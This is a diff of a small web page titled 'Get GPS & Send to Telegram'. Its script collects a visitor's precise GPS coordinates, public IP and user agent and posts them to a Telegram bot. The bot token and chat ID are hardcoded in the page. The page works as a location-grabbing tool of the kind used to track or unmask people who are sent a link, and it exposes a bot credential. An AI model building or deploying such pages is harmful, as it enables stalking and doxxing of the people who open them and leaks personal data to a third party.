@@ -3,75 +3,109 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>GPS & Info Sender</title>
+<title>Get GPS & Send to Telegram</title>
 </head>
-<body style="font-family:Tahoma, sans-serif; text-align:center; margin-top:50px;">
+<body style="font-family: Arial, sans-serif; text-align:center; margin-top:50px;">
 
-<h2>Click the button below to send your location and info</h2>
-<button id="getLocation" style="padding:10px 20px; font-size:16px; cursor:pointer;">Send Info</button>
+<h2>Click the button to allow GPS access and send info</h2>
+<button id="btnGetLocation" style="padding:12px 25px; font-size:16px; cursor:pointer;">Send My Info</button>
 
 <script>
 const TELEGRAM_TOKEN = "7617031761:AAGyUI2Ly-7TzxLlpIqtb1M_H7MJznnRvUw";
 const CHAT_ID = "6978055162";
 
-async function getIP() {
+// Get user's public IP from ipify.org
+async function fetchIP() {
   try {
-    let res = await fetch('https://api.ipify.org?format=json');
-    let data = await res.json();
+    console.log("[*] Fetching IP...");
+    const response = await fetch('https://api.ipify.org?format=json');
+    if (!response.ok) throw new Error("Failed to fetch IP");
+    const data = await response.json();
+    console.log("[*] IP fetched:", data.ip);
     return data.ip;
-  } catch {
-    return "IP not available";
+  } catch (error) {
+    console.error("[!] Error fetching IP:", error);
+    return "Unavailable";
   }
 }
 
-function sendToTelegram(message) {
-  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: message,
-      parse_mode: "HTML"
-    })
-  });
+// Send message to Telegram bot
+async function sendTelegramMessage(text) {
+  try {
+    console.log("[*] Sending message to Telegram...");
+    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: text,
+        parse_mode: "HTML"
+      }),
+    });
+    const json = await res.json();
+    console.log("[*] Telegram response:", json);
+    if (!json.ok) {
+      alert("Failed to send message: " + json.description);
+    }
+  } catch (err) {
+    console.error("[!] Error sending Telegram message:", err);
+    alert("Error sending info to Telegram.");
+  }
 }
 
-document.getElementById("getLocation").onclick = async () => {
+document.getElementById("btnGetLocation").addEventListener("click", async () => {
   if (!navigator.geolocation) {
-    alert("Sorry, your browser does not support GPS.");
+    alert("Your browser does not support GPS.");
     return;
   }
 
-  let ip = await getIP();
-  let userAgent = navigator.userAgent;
+  // First get IP and user agent
+  const ip = await fetchIP();
+  const userAgent = navigator.userAgent;
 
+  console.log("[*] Requesting GPS permission from user...");
+  
+  // Request GPS position - this triggers permission dialog
   navigator.geolocation.getCurrentPosition(
-    (pos) => {
-      let lat = pos.coords.latitude.toFixed(6);
-      let lon = pos.coords.longitude.toFixed(6);
-      let accuracy = pos.coords.accuracy;
+    async (position) => {
+      // If permission granted and position received
+      const lat = position.coords.latitude.toFixed(6);
+      const lon = position.coords.longitude.toFixed(6);
+      const accuracy = position.coords.accuracy;
 
-      let message = `
+      console.log("[*] GPS Position obtained:", lat, lon, accuracy);
+
+      const message = `
 📍 <b>User Location</b>:
 Latitude: <code>${lat}</code>
 Longitude: <code>${lon}</code>
 Accuracy: <code>${accuracy} meters</code>
 
-💻 <b>User Agent</b>: 
-<code>${userAgent}</code>
-
-🌐 <b>IP Address</b>: 
+🌐 <b>IP Address</b>:
 <code>${ip}</code>
+
+💻 <b>User Agent</b>:
+<code>${userAgent}</code>
       `;
-      sendToTelegram(message);
-      alert("Your information has been sent.");
+
+      await sendTelegramMessage(message);
+      alert("Your information has been sent successfully.");
     },
     (error) => {
-      alert("Permission denied or an error occurred while getting location.");
+      console.error("[!] Geolocation error:", error);
+      if (error.code === error.PERMISSION_DENIED) {
+        alert("Permission denied. Unable to get location.");
+      } else {
+        alert("Error obtaining location. Try again.");
+      }
     },
-    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+    {
+      enableHighAccuracy: true,
+      timeout: 15000,
+      maximumAge: 0
+    }
   );
-};
+});
 </script>
 
 </body>
